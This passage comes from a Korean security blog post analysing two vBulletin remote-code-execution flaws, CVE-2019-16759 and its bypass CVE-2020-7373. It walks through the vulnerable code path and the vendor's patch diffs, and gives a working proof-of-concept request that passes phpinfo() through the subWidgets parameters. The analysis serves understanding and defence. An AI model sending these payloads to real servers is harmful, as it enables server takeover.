<p><strong>그리고 사용자 값을 받을 때, $_REQUEST를 이용해서 받아 오기 때문에 GET, POST 메서드를 이용해서 공격을 수행할 수 있습니다. 그러니 GET으로 익스를 하려면 위와 같이 그냥 값을 넘겨 주게 되면 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 참이 반환되는 동시에 vB5_Frontend_ApplicationLight::init가 실행 돼 __construct 메서드가 실행이 될 것이고, __construct 메서드에서도 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 handler를 callRender로 설정하게 됩니다. callRender 메서드에서는 routeInfo[2]의 값으로는 <code>&#39;widget_php&#39;</code>, widgetConfig[‘code’]의 값으로는 <code>&#39;phpinfo();&#39;</code>가 들어가 있어 2개의  widget_php 템플릿으로 전송이 됩니다. widget_php에서는 widgetConfig[‘code’]가 비어있지 않기 때문에 evalCode로 widgetConfig[‘code’]가 전송이 되어 phpinfo(); 함수가 실행이 되며 RCE가 성공적으로 트리거 되게 됩니다.</strong><br><br></p>
<hr>
<h2 id="CVE-2019-16759-Patch"><a href="#CVE-2019-16759-Patch" class="headerlink" title="CVE-2019-16759 Patch"></a><em>CVE-2019-16759 Patch</em></h2><p><strong>CVE-2019-16759 취약점은 총 2개의 패치가 이루어졌다고 합니다.</strong><br></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Remove any problematic values from the template</span></span><br><span class="line"><span class="comment"> *      variable arrays before rendering</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//for now don&#x27;t pass the values through.  These arrays are potentially large</span></span><br><span class="line"><span class="comment">//and we don&#x27;t want to make unnecesary copies.  The alternative is to pass by</span></span><br><span class="line"><span class="comment">//reference which causes it&#x27;s own headaches.  It&#x27;s an internal function and the</span></span><br><span class="line"><span class="comment">//relevant arrays are all class variables.</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanRegistered</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">        <span class="variable">$disallowedNames</span> = <span class="keyword">array</span>(<span class="string">&#x27;widgetConfig&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$disallowedNames</span> <span class="keyword">AS</span> <span class="variable">$name</span>)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;registered[<span class="variable">$name</span>]);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$globalRegistered</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>첫  패치는 <code>clearRegistered</code>라는 함수를 이용해서 widgetConfig라는 값이 사용되면 <code>unset()</code> 함수를 이용해서 제거하고 있습니다. 그러니 Query String 이나 Raw Data로 <code>widgetConfig[&#39;code&#39;]=phpinfo();</code>라는 값이 들어오게 되면 widgetConfig가 존재하기 때문에 <code>unset()</code>에 의해서 제거가 될 것 입니다.</strong><br></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php	<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.356918994</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php	<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.577517014</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-286</span>,<span class="number">20</span> +<span class="number">286</span>,<span class="number">32</span> @@</span><br><span class="line"> 			<span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line"> 		&#125;</span><br><span class="line"> </span><br><span class="line">-		<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">-		<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">-			<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">-			<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">-			<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>],</span><br><span class="line">-			<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">-			<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">-			<span class="comment">// not sending the data to the template</span></span><br><span class="line">-			<span class="comment">// render</span></span><br><span class="line">-			<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">-		));</span><br><span class="line">-		Api_InterfaceAbstract::setLight();</span><br><span class="line">+		<span class="variable">$templateName</span> = <span class="variable">$routeInfo</span>[<span class="number">2</span>];</span><br><span class="line">+		<span class="keyword">if</span> (<span class="variable">$templateName</span> == <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+		&#123;</span><br><span class="line">+			<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">+				<span class="string">&#x27;template&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">+				<span class="string">&#x27;css_links&#x27;</span> =&gt; <span class="keyword">array</span>(),</span><br><span class="line">+			);</span><br><span class="line">+		&#125;</span><br><span class="line">+		<span class="keyword">else</span></span><br><span class="line">+		&#123;</span><br><span class="line">+			<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">+			<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">+				<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">+				<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">+				<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$templateName</span>,</span><br><span class="line">+				<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">+				<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">+				<span class="comment">// not sending the data to the template</span></span><br><span class="line">+				<span class="comment">// render</span></span><br><span class="line">+				<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">+			));</span><br><span class="line">+			Api_InterfaceAbstract::setLight();</span><br><span class="line">+			<span class="variable">$result</span> = vB5_Template::staticRenderAjax(<span class="variable">$templateName</span>, <span class="variable">$serverData</span>);</span><br><span class="line">+		&#125;</span><br><span class="line"> </span><br><span class="line">-		<span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$serverData</span>));</span><br><span class="line">+		<span class="keyword">$this</span>-&gt;sendAsJson(<span class="variable">$result</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> </span><br><span class="line"> 	<span class="comment">/**</span></span><br></pre></td></tr></table></figure>
<p><strong>그리고 두 번째 패치는 <code>$routeInfo[2]</code>(Template Name)의 값으로 <code>widget_php</code>가 들어오게 되면 빈 템플릿과 CSS를 반환하도록 하는 조건문을 추가함으로 0-day에 대응하게 되었습니다.</strong><br></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> 	diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php	<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.276913797</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php	<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.493511575</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-12</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">26</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template_Runtime</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">+	<span class="comment">//This is intended to allow the runtime to know that template it is rendering.</span></span><br><span class="line">+	<span class="comment">//It&#x27;s ugly and shouldn&#x27;t be used lightly, but making some features widely</span></span><br><span class="line">+	<span class="comment">//available to all templates is uglier.</span></span><br><span class="line">+	<span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">startTemplate</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">+	</span>&#123;</span><br><span class="line">+		array_push(<span class="built_in">self</span>::<span class="variable">$templates</span>, <span class="variable">$template</span>);</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">endTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+	</span>&#123;</span><br><span class="line">+		array_pop(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">currentTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+	</span>&#123;</span><br><span class="line">+		<span class="keyword">return</span> end(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line"> 	<span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$units</span> = <span class="keyword">array</span>(</span><br><span class="line"> 		<span class="string">&#x27;%&#x27;</span>,</span><br><span class="line"> 		<span class="string">&#x27;px&#x27;</span>,</span><br><span class="line">@@ <span class="number">-1944</span>,<span class="number">6</span> +<span class="number">1964</span>,<span class="number">21</span> @@</span><br><span class="line"> 			<span class="keyword">return</span> <span class="string">&#x27;&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$timerName</span>) . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$elapsed</span> . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalPhp</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">+	</span>&#123;</span><br><span class="line">+		<span class="comment">//only allow the PHP widget template to do this.  This prevents a malicious user</span></span><br><span class="line">+		<span class="comment">//from hacking something into a different template.</span></span><br><span class="line">+		<span class="keyword">if</span> (<span class="built_in">self</span>::currentTemplate() != <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+		&#123;</span><br><span class="line">+			<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">+		&#125;</span><br><span class="line">+		ob_start();</span><br><span class="line">+		<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">+		<span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">+		ob_end_clean();</span><br><span class="line">+		<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">+	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><strong>또한 evalPhP 메서드의 현재 템플릿이 widget_php가 아니면 Null을 반환하도록 하는 조건문을 추가해서, 다른 템플릿에서 악용될 요소도 제거하는 것을 볼 수 있습니다. (Line 342 ~ 345)</strong><br></p>
<p><strong>이와 같이 총 2곳을 패치해서 0-day 취약점을 제거했지만 약 1년 정도가 지나고 한 보안 연구원에 의해서 우회가 돼 0-day가 다시 나오게 되었습니다.</strong><br></p>
<hr>
<h2 id="CVE-2020-7373"><a href="#CVE-2020-7373" class="headerlink" title="CVE-2020-7373"></a><em>CVE-2020-7373</em></h2><p><strong><code>CVE-2020-7373</code>은 <code>CVE-2019-16759</code>를 패치한 것을 우회해 다시 RCE 취약점을 트리거 한 0-day 입니다. 해당 취약점은 본례의 익스 방식과 크게 다를 게 없지만 다르다면 템플릿을 <code>widget_php</code>가 아닌 <code>widget_tabbedcontainer_tab_panel</code>이라는 템플릿을 이용해서 익스를 진행하였습니다.</strong><br></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_tabbedcontainer_tab_panel&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1532130449&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.4.4 Alpha 2&quot;</span>&gt;</span>&lt;![CDATA[&#123;vb:set panel_id, &#123;vb:concat &#123;vb:var id_prefix&#125;, &#123;vb:var tab_num&#125;&#125;&#125;</span><br><span class="line">&lt;div id=&quot;&#123;vb:var panel_id&#125;&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;</span><br><span class="line">	&lt;vb:comment&gt;</span><br><span class="line">	- &#123;vb:var panel_id&#125; </span><br><span class="line">	&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">	&amp;nbsp;&amp;nbsp;-- &#123;vb:raw subWidget.template&#125;</span><br><span class="line">	&lt;/vb:each&gt;</span><br><span class="line">	&lt;/vb:comment&gt;</span><br><span class="line"> </span><br><span class="line">	&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">		&#123;vb:template &#123;vb:raw subWidget.template&#125;, </span><br><span class="line">			widgetConfig=&#123;vb:raw subWidget.config&#125;, </span><br><span class="line">			widgetinstanceid=&#123;vb:raw subWidget.widgetinstanceid&#125;,</span><br><span class="line">			widgettitle=&#123;vb:raw subWidget.title&#125;, </span><br><span class="line">			tabbedContainerSubModules=&#123;vb:raw subWidget.tabbedContainerSubModules&#125;,</span><br><span class="line">			product=&#123;vb:raw subWidget.product&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&lt;/vb:each&gt; </span><br><span class="line">&lt;/div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong><code>widget_tabbedcontainer_tab_panel</code> 템플릿은 자식 템플릿을 생성해주는 템플릿이라고 합니다. 하단의 보면 subWidget.template를 이용해서 템플릿 이름을 정하고, {vb:raw subWidget.config}를 이용해서 widgetConfig에 값을 넣어주는 것을 볼 수 있습니다.</strong><br><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC : http:&#x2F;&#x2F;141.164.52.207&#x2F;?subWidgets[0][template]&#x3D;widget_php&amp;subWidgets[0][config][code]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
<p><strong>그러니 위와 같이 subWidget.template의 값으로 <code>widget_php</code>, subWidget.config의 값으로 <code>code:phpinfo();</code>로 넘겨주면 template의 값은 <code>widget_php</code>, widgetConfig.code의 값은 <code>phpinfo();</code>가 될 것 이고, widget_php 템플릿이 생성되면 widgetConfig[‘code’]의 값은 <code>phpinfo();</code>이므로 <code>widget_php</code>에서 <code>CVE-2019-16759</code>와 동일하게 RCE가 트리거 되게 됩니다.</strong><br></p>
<hr>
<h2 id="CVE-2020-7373-Patch"><a href="#CVE-2020-7373-Patch" class="headerlink" title="CVE-2020-7373 Patch"></a><em>CVE-2020-7373 Patch</em></h2><p><strong>패치 코드가 안 보임</strong><br></p>
<hr>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-16759"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-16759</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-16759-Patch"><span class="toc-number">2.</span> <span class="toc-text">CVE-2019-16759 Patch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-7373"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-7373</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-7373-Patch"><span class="toc-number">4.</span> <span class="toc-text">CVE-2020-7373 Patch</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&text=0-day RCE in vBulletin"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&is_video=false&description=0-day RCE in vBulletin"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=0-day RCE in vBulletin&body=Check out this article: http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&name=0-day RCE in vBulletin&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&t=0-day RCE in vBulletin"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2021
    Jeongwon Jo
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'https-pocas-kr';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
